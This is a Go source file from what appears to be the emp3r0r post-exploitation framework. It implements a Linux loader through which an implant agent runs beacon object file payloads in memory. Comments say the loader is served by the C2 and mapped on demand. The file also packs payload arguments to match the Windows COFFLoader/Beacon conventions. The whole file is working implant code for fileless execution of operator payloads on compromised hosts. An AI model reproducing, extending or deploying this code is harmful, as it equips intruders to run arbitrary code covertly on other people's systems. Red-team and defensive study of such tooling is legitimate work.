//go:build linux

package coffloader

import (
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"runtime"
	"strconv"
	"unicode/utf16"
	"unsafe"

	"github.com/jm33-m0/emp3r0r/core/lib/memdeps"
	"github.com/jm33-m0/emp3r0r/core/lib/memmod"
)

// linuxDependency is the module that provides the Linux BOF loader. The C2
// hosts it as coffloader_linux.<arch>.gz; the agent maps it on demand, exactly
// like the Windows COFFLoader DLL.
const linuxDependency = "coffloader_linux"

// maxLoaderOutput bounds the C string read from the loader so a corrupted
// return value cannot make the agent scan unmapped memory forever.
const maxLoaderOutput = 16 << 20

// RunLinuxCOFF executes an x86_64 ELF BOF payload on Linux through the
// coffloader_linux dependency. The dependency is resolved, mapped, used once,
// and unmapped by memdeps.Use.
func RunLinuxCOFF(payload []byte, export string, args []CoffArg, _ uintptr) (string, error) {
	if len(payload) == 0 {
		return "", fmt.Errorf("empty payload")
	}

	packedArgs, err := PackCoffArgs(args)
	if err != nil {
		return "", err
	}

	wire, err := packLinuxArgs(packedArgs)
	if err != nil {
		return "", err
	}

	if export == "" {
		export = "go"
	}
	entry := append([]byte(export), 0)

	// The loader installs process signal handlers and executes the BOF on the
	// calling OS thread, so pin the goroutine to it.
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	var out string
	err = memdeps.Use(linuxDependency, func(module *memmod.Module) error {
		var argsPtr uintptr
		if len(wire) > 0 {
			argsPtr = uintptr(unsafe.Pointer(&wire[0]))
		}

		result, callErr := module.CallExportWithArgs("bof_run",
			uintptr(unsafe.Pointer(&payload[0])),
			uintptr(len(payload)),
			uintptr(unsafe.Pointer(&entry[0])),
			argsPtr,
			uintptr(len(wire)),
		)
		if callErr != nil {
			return callErr
		}
		runtime.KeepAlive(payload)
		runtime.KeepAlive(wire)
		runtime.KeepAlive(entry)

		if result == 0 {
			if msg := loaderError(module); msg != "" {
				return fmt.Errorf("%s", msg)
			}
			return fmt.Errorf("linux BOF loader failed")
		}

		out = readCString(result)
		// The loader allocated the buffer; let it free it while its code is
		// still mapped.
		_, _ = module.CallExportWithArgs("bof_free", result)
		return nil
	})
	return out, err
}

// loaderError fetches the loader's last error message, if any.
func loaderError(module *memmod.Module) string {
	ptr, err := module.CallExportWithArgs("bof_last_error")
	if err != nil || ptr == 0 {
		return ""
	}
	return readCString(ptr)
}

// readCString reads a NUL-terminated string from mapped memory.
func readCString(ptr uintptr) string {
	if ptr == 0 {
		return ""
	}
	buf := make([]byte, 0, 64)
	for i := uintptr(0); i < maxLoaderOutput; i++ {
		b := *(*byte)(unsafe.Pointer(ptr + i))
		if b == 0 {
			break
		}
		buf = append(buf, b)
	}
	return string(buf)
}

// packLinuxArgs mirrors lighthouse.PackArgs for the subset used by PackCoffArgs.
func packLinuxArgs(args []string) ([]byte, error) {
	if len(args) == 0 {
		return nil, nil
	}

	var body []byte
	for _, arg := range args {
		if arg == "" {
			return nil, fmt.Errorf("empty arg")
		}

		switch arg[0] {
		case 'b':
			data, err := hex.DecodeString(arg[1:])
			if err != nil {
				return nil, fmt.Errorf("pack binary: %w", err)
			}
			body = appendU32(body, uint32(len(data)))
			body = append(body, data...)
		case 'i':
			v, err := strconv.ParseInt(arg[1:], 10, 32)
			if err != nil {
				return nil, fmt.Errorf("pack int: %w", err)
			}
			body = appendU32(body, uint32(v))
		case 's':
			v, err := strconv.ParseInt(arg[1:], 10, 16)
			if err != nil {
				return nil, fmt.Errorf("pack short: %w", err)
			}
			body = appendU16(body, uint16(v))
		case 'z':
			// Narrow string. Match the Windows COFFLoader ABI: length-prefixed
			// AND NUL-terminated, so BOFs that pass the extracted pointer to
			// BeaconPrintf("%s") do not read past the argument.
			b := append([]byte(arg[1:]), 0)
			body = appendU32(body, uint32(len(b)))
			body = append(body, b...)
		case 'Z':
			// Wide string: UTF-16LE plus a 2-byte terminator, matching the
			// Windows packCString/utf16Bytes convention.
			u := utf16.Encode([]rune(arg[1:]))
			buf := make([]byte, len(u)*2+2)
			for i, r := range u {
				buf[i*2] = byte(r)
				buf[i*2+1] = byte(r >> 8)
			}
			body = appendU32(body, uint32(len(buf)))
			body = append(body, buf...)
		default:
			return nil, fmt.Errorf("unknown arg prefix %q", arg[0])
		}
	}

	out := make([]byte, 4, 4+len(body))
	binary.LittleEndian.PutUint32(out, uint32(len(body)))
	out = append(out, body...)
	return out, nil
}

func appendU32(b []byte, v uint32) []byte {
	return append(b, byte(v), byte(v>>8), byte(v>>16), byte(v>>24))
}

func appendU16(b []byte, v uint16) []byte {
	return append(b, byte(v), byte(v>>8))
}
